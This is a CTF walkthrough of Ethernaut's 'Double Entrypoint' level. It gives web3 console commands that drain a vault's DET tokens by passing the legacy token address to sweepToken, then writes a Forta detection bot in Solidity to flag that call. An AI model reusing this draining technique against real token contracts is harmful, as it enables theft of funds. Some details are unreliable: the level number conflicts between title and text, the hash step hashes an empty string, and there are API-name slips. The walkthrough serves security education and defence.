# Ethernaut Level 27 (Double Entrypoint) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 28. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The exploit arises from the LegacyToken.transfer() function essentially transferring DET tokens instead of LGT tokens. The lesson here is to minimise cross contract calls, and add a battery of checks in contracts to prevent contracts/ functions from having excessive authority. In addition, logic should be made less atomic; this increases attack time and reduces changes of a successful attack. Let's start with our hack.

1.  See what contract we have in the contract object in the JS terminal. `contract.abi` will give us the ABI; we can see that we have an instance of the DET Token contract. Now, to drain the CryptoVault contract of its DET balance, we need to call the `cryptoVault.sweepToken()` function, passing it the address of the LegacyToken (LGT), which will in turn call DET.delegateTransfer() thereby draining the DET balance of cryptoVault, which will be the originalSender for the call.
    
2.  Get the cryptoVault address: `let cryptoVault = await contract.ctryptoVault()` and the LGT address `let legacyToken = await contract.delegatedFrom()`, since these two variables inside DET hold these addresses.
    
3.  Finally, we call \`cryptoVault.sweepToken()\`\`, passing it the address of the legacy token. First, we construct the function call:
    

```
let callStr = web3.eth.abi.encodeFunctionCall({
    name: 'sweepToken',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'token'
    }]
}, [legacyToken]);
```

Then, we send the transaction:

`await web3.eth.sendTransaction({from: player, to: cryptoVault, data: callStr})`

We just drained the underlying token (DET) from cryptoVault.

The second step is to write a bot contract that sends an alert when the origSender inside the `delegateTransfer()` function is the `CryptoVault` contract. For this, we must also first familiarize outselves with the calldata layout. This is because our bot would need to extract the address from the function calldata.

#### Calldata

Let us look at the any of calldata.

1.  The first 4 bytes constitute the function selector, i.e., the first four bytes of the Keccak-256 hash of the function signature.
2.  Starting from the fifth byte, encoded arguments follow.

The function we want to monitor is `function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool)`. Its signature is `delegateTransfer(address,uint256,address)`.

Lets calculate the keccak256 hash of this signature.

`web3.eth.utils.keccak256("")`

whis turns out to be `0x9cd1a1211670344edaaf7bd8870bf83bfb7b31a93c51b25e35de130796af11ee`

Extract the first 4 bytes. In Hexadecimal notation, 2 characters represent 1 byte. Thus, `9cd1a121`. In the call data, these will be the first 4 bytes. The arguments are encoded and placed in the calldata in 32 byte words, with zeros being padded to the left if needed.

Our calldata will thus looklike:

`4-bytes-selector+32bytes-address+32bytes-uint+32bytes-address`
(addresses are 20 bytes, with left-padded 0s). In total, 100 bytes (0x64 in hex). Since we are interested in only the third argument (origSender), we only need to extract and decode that from the call data.

Inside a function, we refer to the calldata as `msg.data`, which gives us the entirety of the calldata in bytes. We are only interested in the last 32 bytes.

With this knowledge, we can implement our detection bot. We know that it needs to adhere to the given interface:

```
interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}
```

The fortaNotify modifier calls the bot's notification function passing it the player address, and the msg.data of the call to `delegatedCall()`.

`forta.notify(player, msg.data);`

Let's implement the bot contract now. One thing to note is that `abi.decode` takes 2 args, the first is the starting offset, the second is a tuple of the decode destination types. We want to use this function to decode our calldata, starting from right after the function selector (so the 5th byte), uptill the end, with the destination types being `addres, uint, address`, in that order. The following line does this:

`(,,address origSender) = abi.decode(msgData[4:], (address, uint256, address));`

We are destructuring the tuple of decoded values, ignoring the first two values, and assigning the third to the variable `adddres origSender`. `msgData[4:]` returns all the items of the byte arra msgData, starting from the 5th index(or starting right after the fourth index).

```
pragma solidity ^0.8.0;

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function raiseAlert(address user) external;
}

contract MyDetectionBot is IDetectionBot {
// handleTransaction is called by Forta.notify(player, msg.data)
address public origSender;
address public cryptoVault;
    function handleTransaction(address user, bytes calldata msgData) override external {
    // see the explanatory note preceding this code block to understand this like
        (,,origSender) = abi.decode(msgData[4:], (address, uint256, address));
        // If the origSender is cryptoVault contract
        if (origSender == address(cryptoVault))  {
        // call Forta.raiseAlert()
            IForta(msg.sender).raiseAlert(user);
        }
    }

    function setVault(address vault) public {
        cryptoVault = vault;
    }
}
```

Finally, we call Forta.setDetectionBot(botAddress) to register our bot in the Forta contract.

- Fetch Forta contract address: `let forta = await contract.forta()`.
- construct the funciton call to set the bot:

```
let callStr = web3.eth.abi.encodeFunctionCall({
    name: 'setDetectionBot',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'detectionBotAddress'
    }],
}, [botAddress]);
```

- Send the tx: `await web3.eth.sendTransaction({from: player, to: await contract.forta(), data: callStr})`

The alert chronology is thus:

delegatedCall()->Forta.notify(player,calldata)->handleTransaction()->Forta.raiseAlert(player).

Thus, Forta alerts that the user who send this tx, might be an exploiter.

**Note that in order to pass this level, you must only deploy the bot, register/set it in the forta contract, and then click submit.**
